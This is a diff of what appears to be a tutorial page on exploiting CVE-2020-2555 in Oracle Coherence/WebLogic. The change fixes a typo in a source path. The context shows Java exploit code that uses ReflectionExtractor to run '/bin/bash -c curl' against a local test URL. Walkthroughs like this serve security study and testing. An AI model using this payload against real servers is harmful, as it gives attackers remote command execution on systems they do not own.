@@ -338,7 +338,7 @@
 </span>
 </li>
 <li>
-<p>At the core of this exploit is <span style="font-family: Courier, monospace; font-weight: 600;">ReflectionExtractor</span> which allows us to invoke arbitrary methods via reflection. We’ll modify its parameters in <span style="font-family: Courier, monospace; font-weight: 600;">src/com/superam/CVE-2020-2555.java</span> to control what gets executed:</p>
+<p>At the core of this exploit is <span style="font-family: Courier, monospace; font-weight: 600;">ReflectionExtractor</span> which allows us to invoke arbitrary methods via reflection. We’ll modify its parameters in <span style="font-family: Courier, monospace; font-weight: 600;">src/com/supeream/CVE-2020-2555.java</span> to control what gets executed:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ReflectionExtractor extractor3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReflectionExtractor(
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;exec&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;curl http://127.0.0.1:8080/test&#34;</span>}}
